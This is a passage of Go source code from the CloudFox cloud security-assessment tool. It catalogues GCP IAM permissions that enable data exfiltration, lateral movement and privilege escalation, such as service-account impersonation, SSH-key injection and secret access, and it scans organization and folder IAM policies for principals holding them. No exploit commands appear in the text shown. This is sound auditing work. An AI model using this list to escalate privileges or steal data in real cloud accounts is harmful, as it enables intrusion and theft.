package attackpathservice

import (
	"context"
	"fmt"
	"strings"

	iampb "cloud.google.com/go/iam/apiv1/iampb"
	resourcemanager "cloud.google.com/go/resourcemanager/apiv3"
	resourcemanagerpb "cloud.google.com/go/resourcemanager/apiv3/resourcemanagerpb"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/BishopFox/cloudfox/internal/gcp/sdk"
	crmv1 "google.golang.org/api/cloudresourcemanager/v1"
	"google.golang.org/api/iam/v1"
	"google.golang.org/api/iterator"

	// Resource-level IAM
	"google.golang.org/api/bigquery/v2"
	"google.golang.org/api/cloudkms/v1"
	"google.golang.org/api/compute/v1"
	run "google.golang.org/api/run/v1"
	"google.golang.org/api/pubsub/v1"
	"google.golang.org/api/secretmanager/v1"
	"google.golang.org/api/spanner/v1"
	"google.golang.org/api/storage/v1"
	cloudfunctions "google.golang.org/api/cloudfunctions/v2"
)

var logger = internal.NewLogger()

// AttackPathService provides analysis for data exfiltration and lateral movement paths
type AttackPathService struct {
	session *gcpinternal.SafeSession
}

func New() *AttackPathService {
	return &AttackPathService{}
}

func NewWithSession(session *gcpinternal.SafeSession) *AttackPathService {
	return &AttackPathService{session: session}
}

// getIAMService returns an IAM service using cached session if available
func (s *AttackPathService) getIAMService(ctx context.Context) (*iam.Service, error) {
	if s.session != nil {
		return sdk.CachedGetIAMService(ctx, s.session)
	}
	return iam.NewService(ctx)
}

// getResourceManagerService returns a Resource Manager service using cached session if available
func (s *AttackPathService) getResourceManagerService(ctx context.Context) (*crmv1.Service, error) {
	if s.session != nil {
		return sdk.CachedGetResourceManagerService(ctx, s.session)
	}
	return crmv1.NewService(ctx)
}

// getStorageService returns a Storage service using cached session if available
func (s *AttackPathService) getStorageService(ctx context.Context) (*storage.Service, error) {
	if s.session != nil {
		return sdk.CachedGetStorageService(ctx, s.session)
	}
	return storage.NewService(ctx)
}

// getBigQueryService returns a BigQuery service using cached session if available
func (s *AttackPathService) getBigQueryService(ctx context.Context) (*bigquery.Service, error) {
	if s.session != nil {
		return sdk.CachedGetBigQueryService(ctx, s.session)
	}
	return bigquery.NewService(ctx)
}

// getComputeService returns a Compute service using cached session if available
func (s *AttackPathService) getComputeService(ctx context.Context) (*compute.Service, error) {
	if s.session != nil {
		return sdk.CachedGetComputeService(ctx, s.session)
	}
	return compute.NewService(ctx)
}

// getSecretManagerService returns a Secret Manager service
func (s *AttackPathService) getSecretManagerService(ctx context.Context) (*secretmanager.Service, error) {
	if s.session != nil {
		return sdk.CachedGetSecretManagerService(ctx, s.session)
	}
	return secretmanager.NewService(ctx)
}

// getCloudFunctionsService returns a Cloud Functions v2 service
func (s *AttackPathService) getCloudFunctionsService(ctx context.Context) (*cloudfunctions.Service, error) {
	if s.session != nil {
		return sdk.CachedGetCloudFunctionsServiceV2(ctx, s.session)
	}
	return cloudfunctions.NewService(ctx)
}

// getCloudRunService returns a Cloud Run service
func (s *AttackPathService) getCloudRunService(ctx context.Context) (*run.APIService, error) {
	if s.session != nil {
		return sdk.CachedGetCloudRunService(ctx, s.session)
	}
	return run.NewService(ctx)
}

// getKMSService returns a KMS service
func (s *AttackPathService) getKMSService(ctx context.Context) (*cloudkms.Service, error) {
	if s.session != nil {
		return sdk.CachedGetKMSService(ctx, s.session)
	}
	return cloudkms.NewService(ctx)
}

// getPubSubService returns a Pub/Sub service
func (s *AttackPathService) getPubSubService(ctx context.Context) (*pubsub.Service, error) {
	if s.session != nil {
		return sdk.CachedGetPubSubService(ctx, s.session)
	}
	return pubsub.NewService(ctx)
}

// getSpannerService returns a Spanner service
func (s *AttackPathService) getSpannerService(ctx context.Context) (*spanner.Service, error) {
	if s.session != nil {
		return sdk.CachedGetSpannerService(ctx, s.session)
	}
	return spanner.NewService(ctx)
}

// DataExfilPermission represents a permission that enables data exfiltration
type DataExfilPermission struct {
	Permission  string `json:"permission"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// LateralMovementPermission represents a permission that enables lateral movement
type LateralMovementPermission struct {
	Permission  string `json:"permission"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// PrivescPermission represents a permission that enables privilege escalation
type PrivescPermission struct {
	Permission  string `json:"permission"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// AttackPath represents an attack path (exfil, lateral, or privesc)
type AttackPath struct {
	Principal      string   `json:"principal"`
	PrincipalType  string   `json:"principalType"`
	Method         string   `json:"method"`
	TargetResource string   `json:"targetResource"`
	Permissions    []string `json:"permissions"`
	Category       string   `json:"category"`
	RiskLevel      string   `json:"riskLevel"`
	Description    string   `json:"description"`
	ExploitCommand string   `json:"exploitCommand"`
	ProjectID      string   `json:"projectId"`
	ScopeType      string   `json:"scopeType"` // organization, folder, project, resource
	ScopeID        string   `json:"scopeId"`
	ScopeName      string   `json:"scopeName"`
	PathType       string   `json:"pathType"` // "exfil", "lateral", or "privesc"
}

// CombinedAttackPathData holds all attack paths across org/folder/project/resource levels
type CombinedAttackPathData struct {
	OrgPaths      []AttackPath          `json:"orgPaths"`
	FolderPaths   []AttackPath          `json:"folderPaths"`
	ProjectPaths  []AttackPath          `json:"projectPaths"`
	ResourcePaths []AttackPath          `json:"resourcePaths"`
	AllPaths      []AttackPath          `json:"allPaths"`
	OrgNames      map[string]string     `json:"orgNames"`
	FolderNames   map[string]string     `json:"folderNames"`
	OrgIDs        []string              `json:"orgIds"`
}

// GetDataExfilPermissions returns permissions that enable data exfiltration
func GetDataExfilPermissions() []DataExfilPermission {
	return []DataExfilPermission{
		// Compute Exports
		{Permission: "compute.images.create", Category: "Compute Export", RiskLevel: "HIGH", Description: "Create VM images from disks for external export"},
		{Permission: "compute.snapshots.create", Category: "Compute Export", RiskLevel: "HIGH", Description: "Create disk snapshots for external export"},
		{Permission: "compute.disks.createSnapshot", Category: "Compute Export", RiskLevel: "HIGH", Description: "Create snapshots from specific disks"},
		{Permission: "compute.machineImages.create", Category: "Compute Export", RiskLevel: "HIGH", Description: "Create machine images including disk data"},

		// Logging Sinks
		{Permission: "logging.sinks.create", Category: "Logging", RiskLevel: "HIGH", Description: "Create logging sinks to export logs externally"},
		{Permission: "logging.sinks.update", Category: "Logging", RiskLevel: "HIGH", Description: "Modify logging sinks to redirect to external destinations"},

		// Cloud SQL
		{Permission: "cloudsql.backups.create", Category: "Database", RiskLevel: "HIGH", Description: "Create Cloud SQL backups for export"},
		{Permission: "cloudsql.instances.export", Category: "Database", RiskLevel: "CRITICAL", Description: "Export Cloud SQL data to GCS"},

		// Pub/Sub
		{Permission: "pubsub.subscriptions.create", Category: "Messaging", RiskLevel: "HIGH", Description: "Create subscriptions to intercept messages"},
		{Permission: "pubsub.subscriptions.consume", Category: "Messaging", RiskLevel: "MEDIUM", Description: "Pull messages from subscriptions"},
		{Permission: "pubsub.subscriptions.update", Category: "Messaging", RiskLevel: "HIGH", Description: "Modify subscription push endpoints"},

		// BigQuery
		{Permission: "bigquery.tables.export", Category: "BigQuery", RiskLevel: "CRITICAL", Description: "Export BigQuery tables to GCS"},
		{Permission: "bigquery.tables.getData", Category: "BigQuery", RiskLevel: "HIGH", Description: "Read data from BigQuery tables"},
		{Permission: "bigquery.jobs.create", Category: "BigQuery", RiskLevel: "MEDIUM", Description: "Run queries and extract data"},

		// Storage
		{Permission: "storage.objects.get", Category: "Storage", RiskLevel: "HIGH", Description: "Download objects from GCS buckets"},
		{Permission: "storage.objects.list", Category: "Storage", RiskLevel: "MEDIUM", Description: "List objects to identify sensitive data"},

		// Storage Transfer
		{Permission: "storagetransfer.jobs.create", Category: "Storage Transfer", RiskLevel: "CRITICAL", Description: "Create transfer jobs to external clouds"},
		{Permission: "storagetransfer.jobs.update", Category: "Storage Transfer", RiskLevel: "HIGH", Description: "Modify transfer jobs to external destinations"},

		// Spanner
		{Permission: "spanner.databases.export", Category: "Database", RiskLevel: "CRITICAL", Description: "Export Spanner databases to GCS"},
		{Permission: "spanner.databases.read", Category: "Database", RiskLevel: "HIGH", Description: "Read data from Spanner databases"},

		// Firestore/Datastore
		{Permission: "datastore.databases.export", Category: "Database", RiskLevel: "CRITICAL", Description: "Export Firestore/Datastore data to GCS"},
		{Permission: "datastore.entities.get", Category: "Database", RiskLevel: "HIGH", Description: "Read Firestore/Datastore entities"},

		// Bigtable
		{Permission: "bigtable.tables.readRows", Category: "Database", RiskLevel: "HIGH", Description: "Read data from Bigtable tables"},

		// Secrets
		{Permission: "secretmanager.versions.access", Category: "Secrets", RiskLevel: "CRITICAL", Description: "Access secret values (API keys, credentials)"},

		// KMS
		{Permission: "cloudkms.cryptoKeyVersions.useToDecrypt", Category: "Encryption", RiskLevel: "HIGH", Description: "Decrypt encrypted data for exfiltration"},
	}
}

// GetLateralMovementPermissions returns permissions that enable lateral movement
func GetLateralMovementPermissions() []LateralMovementPermission {
	return []LateralMovementPermission{
		// VPC Peering
		{Permission: "compute.networks.addPeering", Category: "Network", RiskLevel: "CRITICAL", Description: "Create VPC peering to access resources in other projects"},
		{Permission: "compute.networks.updatePeering", Category: "Network", RiskLevel: "HIGH", Description: "Modify VPC peering configurations"},
		{Permission: "compute.networks.removePeering", Category: "Network", RiskLevel: "MEDIUM", Description: "Remove VPC peering (disruptive)"},

		// Service Networking
		{Permission: "servicenetworking.services.addPeering", Category: "Network", RiskLevel: "HIGH", Description: "Enable private service access to shared networks"},

		// Shared VPC
		{Permission: "compute.subnetworks.use", Category: "Shared VPC", RiskLevel: "HIGH", Description: "Use shared VPC subnets in other projects"},
		{Permission: "compute.subnetworks.setPrivateIpGoogleAccess", Category: "Shared VPC", RiskLevel: "MEDIUM", Description: "Modify private Google access settings"},

		// Image/Snapshot IAM
		{Permission: "compute.images.setIamPolicy", Category: "Compute Sharing", RiskLevel: "HIGH", Description: "Share VM images with external projects"},
		{Permission: "compute.snapshots.setIamPolicy", Category: "Compute Sharing", RiskLevel: "HIGH", Description: "Share disk snapshots with external projects"},
		{Permission: "compute.machineImages.setIamPolicy", Category: "Compute Sharing", RiskLevel: "HIGH", Description: "Share machine images with external projects"},

		// SA Impersonation
		{Permission: "iam.serviceAccounts.getAccessToken", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Generate tokens for SAs in other projects"},
		{Permission: "iam.serviceAccounts.signBlob", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign as SAs in other projects"},

		// GKE
		{Permission: "container.clusters.getCredentials", Category: "GKE", RiskLevel: "HIGH", Description: "Get credentials for GKE clusters"},
		{Permission: "container.pods.exec", Category: "GKE", RiskLevel: "HIGH", Description: "Execute commands in pods"},
		{Permission: "container.pods.portForward", Category: "GKE", RiskLevel: "HIGH", Description: "Port forward to pods"},

		// Compute Access
		{Permission: "compute.instances.osLogin", Category: "Compute Access", RiskLevel: "HIGH", Description: "SSH into instances via OS Login"},
		{Permission: "compute.instances.osAdminLogin", Category: "Compute Access", RiskLevel: "CRITICAL", Description: "SSH with sudo via OS Login"},
		{Permission: "compute.instances.setMetadata", Category: "Compute Access", RiskLevel: "HIGH", Description: "Add SSH keys via metadata"},
		{Permission: "compute.projects.setCommonInstanceMetadata", Category: "Compute Access", RiskLevel: "CRITICAL", Description: "Add SSH keys project-wide"},

		// Cloud SQL
		{Permission: "cloudsql.instances.connect", Category: "Database Access", RiskLevel: "HIGH", Description: "Connect to Cloud SQL instances"},
		{Permission: "cloudsql.users.create", Category: "Database Access", RiskLevel: "HIGH", Description: "Create database users"},

		// VPN/Interconnect
		{Permission: "compute.vpnTunnels.create", Category: "Network", RiskLevel: "HIGH", Description: "Create VPN tunnels to external networks"},
		{Permission: "compute.interconnects.create", Category: "Network", RiskLevel: "CRITICAL", Description: "Create dedicated interconnects"},
		{Permission: "compute.routers.update", Category: "Network", RiskLevel: "HIGH", Description: "Modify Cloud Router for traffic redirection"},

		// Firewall
		{Permission: "compute.firewalls.create", Category: "Network", RiskLevel: "HIGH", Description: "Create firewall rules to allow access"},
		{Permission: "compute.firewalls.update", Category: "Network", RiskLevel: "HIGH", Description: "Modify firewall rules to allow access"},
		{Permission: "compute.securityPolicies.update", Category: "Network", RiskLevel: "HIGH", Description: "Modify Cloud Armor policies"},

		// IAP
		{Permission: "iap.tunnelInstances.accessViaIAP", Category: "Network", RiskLevel: "MEDIUM", Description: "Access instances via IAP tunnel"},
		{Permission: "iap.tunnelDestGroups.accessViaIAP", Category: "Network", RiskLevel: "MEDIUM", Description: "Access resources via IAP tunnel"},
	}
}

// GetPrivescPermissions returns permissions that enable privilege escalation
// Based on research from DataDog pathfinding.cloud AWS paths, mapped to GCP equivalents
func GetPrivescPermissions() []PrivescPermission {
	return []PrivescPermission{
		// ==========================================
		// SERVICE ACCOUNT IMPERSONATION - CRITICAL
		// AWS equivalent: sts:AssumeRole
		// ==========================================
		{Permission: "iam.serviceAccounts.getAccessToken", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Generate access tokens for any SA (AWS: sts:AssumeRole)"},
		{Permission: "iam.serviceAccounts.signBlob", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign blobs as SA for GCS signed URLs or custom auth"},
		{Permission: "iam.serviceAccounts.signJwt", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign JWTs as SA for custom authentication flows"},
		{Permission: "iam.serviceAccounts.implicitDelegation", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Chain impersonation through intermediary SAs"},
		{Permission: "iam.serviceAccounts.getOpenIdToken", Category: "SA Impersonation", RiskLevel: "HIGH", Description: "Generate OIDC tokens for workload identity federation"},

		// ==========================================
		// KEY/CREDENTIAL CREATION - CRITICAL
		// AWS equivalent: iam:CreateAccessKey
		// ==========================================
		{Permission: "iam.serviceAccountKeys.create", Category: "Key Creation", RiskLevel: "CRITICAL", Description: "Create persistent SA keys (AWS: iam:CreateAccessKey)"},
		{Permission: "iam.serviceAccountKeys.delete", Category: "Key Creation", RiskLevel: "HIGH", Description: "Delete existing keys to create new ones (bypass 10-key limit)"},
		{Permission: "storage.hmacKeys.create", Category: "Key Creation", RiskLevel: "HIGH", Description: "Create HMAC keys for S3-compatible access"},
		{Permission: "apikeys.keys.create", Category: "Key Creation", RiskLevel: "MEDIUM", Description: "Create API keys for service access"},

		// ==========================================
		// IAM POLICY MODIFICATION - CRITICAL
		// AWS equivalent: iam:PutRolePolicy, iam:AttachRolePolicy, iam:CreatePolicyVersion
		// ==========================================
		{Permission: "resourcemanager.projects.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify project IAM - grant any role to any principal"},
		{Permission: "resourcemanager.folders.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify folder IAM - affects all child projects"},
		{Permission: "resourcemanager.organizations.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify org IAM - affects entire organization"},
		{Permission: "iam.serviceAccounts.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Grant impersonation access to service accounts"},
		{Permission: "iam.roles.update", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Add permissions to custom roles (AWS: iam:CreatePolicyVersion)"},
		{Permission: "iam.roles.create", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Create custom roles with dangerous permissions"},
		{Permission: "iam.roles.delete", Category: "IAM Modification", RiskLevel: "MEDIUM", Description: "Delete roles to disrupt access controls"},

		// Resource-level IAM Modification
		{Permission: "storage.buckets.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to storage buckets"},
		{Permission: "pubsub.topics.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to Pub/Sub topics"},
		{Permission: "pubsub.subscriptions.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to Pub/Sub subscriptions"},
		{Permission: "bigquery.datasets.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to BigQuery datasets"},
		{Permission: "artifactregistry.repositories.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to container/artifact registries"},
		{Permission: "compute.instances.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant OS Login access to instances"},
		{Permission: "compute.images.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Share VM images with external projects"},
		{Permission: "compute.snapshots.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Share disk snapshots with external projects"},
		{Permission: "kms.cryptoKeys.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to encryption keys"},

		// ==========================================
		// COMPUTE + SA USAGE (PassRole equivalent)
		// AWS equivalent: iam:PassRole + ec2:RunInstances
		// ==========================================
		{Permission: "compute.instances.create", Category: "Compute", RiskLevel: "HIGH", Description: "Create VMs with attached SA (AWS: PassRole+RunInstances)"},
		{Permission: "compute.instances.setServiceAccount", Category: "Compute", RiskLevel: "HIGH", Description: "Change instance SA to escalate privileges"},
		{Permission: "compute.instances.setMetadata", Category: "Compute", RiskLevel: "HIGH", Description: "Inject SSH keys or startup scripts"},
		{Permission: "compute.projects.setCommonInstanceMetadata", Category: "Compute", RiskLevel: "CRITICAL", Description: "Inject SSH keys project-wide"},
		{Permission: "compute.instances.osLogin", Category: "Compute", RiskLevel: "MEDIUM", Description: "SSH access via OS Login (AWS: ssm:StartSession)"},
		{Permission: "compute.instances.osAdminLogin", Category: "Compute", RiskLevel: "HIGH", Description: "SSH with sudo via OS Login"},
		{Permission: "compute.instanceTemplates.create", Category: "Compute", RiskLevel: "HIGH", Description: "Create templates with SA for MIG exploitation"},

		// ==========================================
		// SERVERLESS + SA USAGE (PassRole equivalent)
		// AWS equivalent: iam:PassRole + lambda:CreateFunction
		// ==========================================
		{Permission: "cloudfunctions.functions.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Deploy functions with SA (AWS: PassRole+Lambda)"},
		{Permission: "cloudfunctions.functions.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify function code or SA"},
		{Permission: "cloudfunctions.functions.sourceCodeSet", Category: "Serverless", RiskLevel: "HIGH", Description: "Replace function source code"},
		{Permission: "cloudfunctions.functions.setIamPolicy", Category: "Serverless", RiskLevel: "HIGH", Description: "Make functions publicly invocable"},

		// Cloud Run (AWS: ECS/Fargate equivalent)
		{Permission: "run.services.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Deploy services with SA (AWS: PassRole+ECS)"},
		{Permission: "run.services.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify service image or SA"},
		{Permission: "run.services.setIamPolicy", Category: "Serverless", RiskLevel: "HIGH", Description: "Make services publicly accessible"},
		{Permission: "run.jobs.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Create jobs with SA identity"},
		{Permission: "run.jobs.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify job configuration or SA"},
		{Permission: "run.jobs.run", Category: "Serverless", RiskLevel: "HIGH", Description: "Execute jobs with attached SA"},

		// ==========================================
		// DATA PROCESSING + SA USAGE (PassRole equivalent)
		// AWS equivalent: iam:PassRole + glue:CreateDevEndpoint, datapipeline:*
		// ==========================================
		{Permission: "dataproc.clusters.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Create Dataproc with SA (AWS: PassRole+Glue)"},
		{Permission: "dataproc.clusters.update", Category: "Data Processing", RiskLevel: "HIGH", Description: "Modify cluster SA or configuration"},
		{Permission: "dataproc.jobs.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Submit jobs to clusters"},
		{Permission: "dataproc.jobs.update", Category: "Data Processing", RiskLevel: "HIGH", Description: "Modify running jobs"},
		{Permission: "dataflow.jobs.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Create Dataflow jobs with SA (AWS: DataPipeline)"},
		{Permission: "dataflow.jobs.update", Category: "Data Processing", RiskLevel: "HIGH", Description: "Modify Dataflow job configuration"},

		// ==========================================
		// ML/AI PLATFORMS + SA USAGE
		// AWS equivalent: iam:PassRole + sagemaker:CreateNotebookInstance
		// ==========================================
		{Permission: "notebooks.instances.create", Category: "AI/ML", RiskLevel: "HIGH", Description: "Create Vertex AI Workbench with SA (AWS: PassRole+SageMaker)"},
		{Permission: "notebooks.instances.update", Category: "AI/ML", RiskLevel: "HIGH", Description: "Modify notebook SA or configuration"},
		{Permission: "notebooks.instances.setIamPolicy", Category: "AI/ML", RiskLevel: "HIGH", Description: "Grant access to notebook instances"},
		{Permission: "aiplatform.customJobs.create", Category: "AI/ML", RiskLevel: "HIGH", Description: "Run custom training jobs with SA"},
		{Permission: "aiplatform.pipelineJobs.create", Category: "AI/ML", RiskLevel: "HIGH", Description: "Create ML pipelines with SA"},

		// ==========================================
		// ORCHESTRATION (Composer = AWS equivalent of Step Functions/MWAA)
		// ==========================================
		{Permission: "composer.environments.create", Category: "Orchestration", RiskLevel: "CRITICAL", Description: "Create Composer/Airflow with SA"},
		{Permission: "composer.environments.update", Category: "Orchestration", RiskLevel: "CRITICAL", Description: "Modify Composer environment SA"},

		// Cloud Scheduler (AWS: EventBridge/CloudWatch Events)
		{Permission: "cloudscheduler.jobs.create", Category: "Orchestration", RiskLevel: "HIGH", Description: "Create scheduled jobs with SA"},
		{Permission: "cloudscheduler.jobs.update", Category: "Orchestration", RiskLevel: "HIGH", Description: "Modify scheduled job SA or target"},

		// Cloud Tasks (AWS: SQS + Lambda triggers)
		{Permission: "cloudtasks.tasks.create", Category: "Orchestration", RiskLevel: "HIGH", Description: "Create tasks with SA for HTTP targets"},
		{Permission: "cloudtasks.queues.create", Category: "Orchestration", RiskLevel: "MEDIUM", Description: "Create task queues"},

		// ==========================================
		// CI/CD (Cloud Build = AWS CodeBuild)
		// AWS equivalent: iam:PassRole + codebuild:CreateProject
		// ==========================================
		{Permission: "cloudbuild.builds.create", Category: "CI/CD", RiskLevel: "CRITICAL", Description: "Run builds with Cloud Build SA (AWS: PassRole+CodeBuild)"},
		{Permission: "cloudbuild.builds.update", Category: "CI/CD", RiskLevel: "HIGH", Description: "Modify build configuration"},
		{Permission: "source.repos.update", Category: "CI/CD", RiskLevel: "HIGH", Description: "Modify source repositories for build injection"},

		// ==========================================
		// INFRASTRUCTURE AS CODE
		// AWS equivalent: iam:PassRole + cloudformation:CreateStack
		// ==========================================
		{Permission: "deploymentmanager.deployments.create", Category: "IaC", RiskLevel: "CRITICAL", Description: "Deploy infra with DM SA (AWS: PassRole+CloudFormation)"},
		{Permission: "deploymentmanager.deployments.update", Category: "IaC", RiskLevel: "HIGH", Description: "Modify deployment templates"},

		// ==========================================
		// KUBERNETES/GKE
		// AWS equivalent: eks:* permissions
		// ==========================================
		{Permission: "container.clusters.create", Category: "GKE", RiskLevel: "HIGH", Description: "Create GKE clusters with node SA"},
		{Permission: "container.clusters.update", Category: "GKE", RiskLevel: "HIGH", Description: "Modify cluster node SA or config"},
		{Permission: "container.clusters.getCredentials", Category: "GKE", RiskLevel: "HIGH", Description: "Get cluster credentials"},
		{Permission: "container.pods.create", Category: "GKE", RiskLevel: "HIGH", Description: "Deploy pods with SA"},
		{Permission: "container.pods.exec", Category: "GKE", RiskLevel: "HIGH", Description: "Exec into pods to steal credentials"},
		{Permission: "container.secrets.get", Category: "GKE", RiskLevel: "HIGH", Description: "Read Kubernetes secrets"},
		{Permission: "container.secrets.create", Category: "GKE", RiskLevel: "MEDIUM", Description: "Create K8s secrets for later access"},
		{Permission: "container.serviceAccounts.createToken", Category: "GKE", RiskLevel: "HIGH", Description: "Generate K8s SA tokens"},

		// ==========================================
		// SECRETS & CREDENTIAL ACCESS
		// AWS equivalent: secretsmanager:GetSecretValue, ssm:GetParameter
		// ==========================================
		{Permission: "secretmanager.versions.access", Category: "Secrets", RiskLevel: "HIGH", Description: "Access secret values (credentials, API keys)"},
		{Permission: "secretmanager.secrets.setIamPolicy", Category: "Secrets", RiskLevel: "HIGH", Description: "Grant access to secrets"},
		{Permission: "secretmanager.secrets.create", Category: "Secrets", RiskLevel: "MEDIUM", Description: "Create secrets for persistence"},

		// ==========================================
		// WORKLOAD IDENTITY FEDERATION
		// AWS equivalent: iam:CreateOpenIDConnectProvider, iam:CreateSAMLProvider
		// ==========================================
		{Permission: "iam.workloadIdentityPools.create", Category: "Federation", RiskLevel: "CRITICAL", Description: "Create pools for external identity access"},
		{Permission: "iam.workloadIdentityPools.update", Category: "Federation", RiskLevel: "HIGH", Description: "Modify pool configuration"},
		{Permission: "iam.workloadIdentityPoolProviders.create", Category: "Federation", RiskLevel: "CRITICAL", Description: "Create providers for external impersonation"},
		{Permission: "iam.workloadIdentityPoolProviders.update", Category: "Federation", RiskLevel: "HIGH", Description: "Modify provider configuration"},

		// ==========================================
		// ORG POLICIES & CONSTRAINTS
		// AWS equivalent: organizations:* SCP modifications
		// ==========================================
		{Permission: "orgpolicy.policy.set", Category: "Org Policy", RiskLevel: "CRITICAL", Description: "Disable security constraints org-wide"},
		{Permission: "orgpolicy.constraints.list", Category: "Org Policy", RiskLevel: "LOW", Description: "Enumerate security constraints"},
		{Permission: "essentialcontacts.contacts.delete", Category: "Org Policy", RiskLevel: "MEDIUM", Description: "Remove security notification contacts"},

		// ==========================================
		// SERVICE ACCOUNT USAGE (Required for most PassRole equivalents)
		// AWS equivalent: iam:PassRole
		// ==========================================
		{Permission: "iam.serviceAccounts.actAs", Category: "SA Usage", RiskLevel: "HIGH", Description: "Use SA for resource creation (AWS: iam:PassRole)"},

		// ==========================================
		// NETWORK ACCESS FOR LATERAL MOVEMENT
		// AWS equivalent: ec2:CreateNetworkInterface, ec2:ModifyInstanceAttribute
		// ==========================================
		{Permission: "iap.tunnelInstances.accessViaIAP", Category: "Network Access", RiskLevel: "MEDIUM", Description: "Access instances via IAP tunnel"},
		{Permission: "compute.firewalls.create", Category: "Network Access", RiskLevel: "HIGH", Description: "Create firewall rules for access"},
		{Permission: "compute.firewalls.update", Category: "Network Access", RiskLevel: "HIGH", Description: "Modify firewall rules"},

		// ==========================================
		// BILLING & RESOURCE CREATION
		// Could be used to exhaust quotas or create resources
		// ==========================================
		{Permission: "billing.accounts.getIamPolicy", Category: "Billing", RiskLevel: "LOW", Description: "View billing IAM for enumeration"},
		{Permission: "billing.accounts.setIamPolicy", Category: "Billing", RiskLevel: "HIGH", Description: "Grant billing access"},
	}
}

// AnalyzeOrganizationAttackPaths analyzes org-level IAM for attack paths
func (s *AttackPathService) AnalyzeOrganizationAttackPaths(ctx context.Context, pathType string) ([]AttackPath, map[string]string, []string, error) {
	var paths []AttackPath
	orgNames := make(map[string]string)
	var orgIDs []string

	// Create organizations client
	var orgsClient *resourcemanager.OrganizationsClient
	var err error
	if s.session != nil {
		orgsClient, err = resourcemanager.NewOrganizationsClient(ctx, s.session.GetClientOption())
	} else {
		orgsClient, err = resourcemanager.NewOrganizationsClient(ctx)
	}
	if err != nil {
		return nil, orgNames, orgIDs, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}
	defer orgsClient.Close()

	// Get IAM service for role resolution
	iamService, err := s.getIAMService(ctx)
	if err != nil {
		iamService = nil
	}

	// Get permission maps based on path type
	exfilPermMap, lateralPermMap, privescPermMap := s.getPermissionMaps(pathType)

	// Search for organizations
	searchReq := &resourcemanagerpb.SearchOrganizationsRequest{}
	it := orgsClient.SearchOrganizations(ctx, searchReq)
	for {
		org, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			break
		}

		orgID := strings.TrimPrefix(org.Name, "organizations/")
		orgNames[orgID] = org.DisplayName
		orgIDs = append(orgIDs, orgID)

		// Get IAM policy for this organization
		policy, err := orgsClient.GetIamPolicy(ctx, &iampb.GetIamPolicyRequest{
			Resource: org.Name,
		})
		if err != nil {
			continue
		}

		// Analyze each binding
		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, "")
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, "",
					"organization", orgID, org.DisplayName,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths, orgNames, orgIDs, nil
}

// AnalyzeFolderAttackPaths analyzes folder-level IAM for attack paths
func (s *AttackPathService) AnalyzeFolderAttackPaths(ctx context.Context, pathType string) ([]AttackPath, map[string]string, error) {
	var paths []AttackPath
	folderNames := make(map[string]string)

	// Create folders client
	var foldersClient *resourcemanager.FoldersClient
	var err error
	if s.session != nil {
		foldersClient, err = resourcemanager.NewFoldersClient(ctx, s.session.GetClientOption())
	} else {
		foldersClient, err = resourcemanager.NewFoldersClient(ctx)
	}
	if err != nil {
		return nil, folderNames, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}
	defer foldersClient.Close()

	// Get IAM service for role resolution
	iamService, err := s.getIAMService(ctx)
	if err != nil {
		iamService = nil
	}

	// Get permission maps based on path type
	exfilPermMap, lateralPermMap, privescPermMap := s.getPermissionMaps(pathType)

	// Search for folders
	searchReq := &resourcemanagerpb.SearchFoldersRequest{}
	it := foldersClient.SearchFolders(ctx, searchReq)
	for {
		folder, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			break
		}

		folderID := strings.TrimPrefix(folder.Name, "folders/")
		folderNames[folderID] = folder.DisplayName

		// Get IAM policy for this folder
		policy, err := foldersClient.GetIamPolicy(ctx, &iampb.GetIamPolicyRequest{
			Resource: folder.Name,
		})
		if err != nil {
			continue
		}

		// Analyze each binding
		for _, binding := range policy.Bindings {
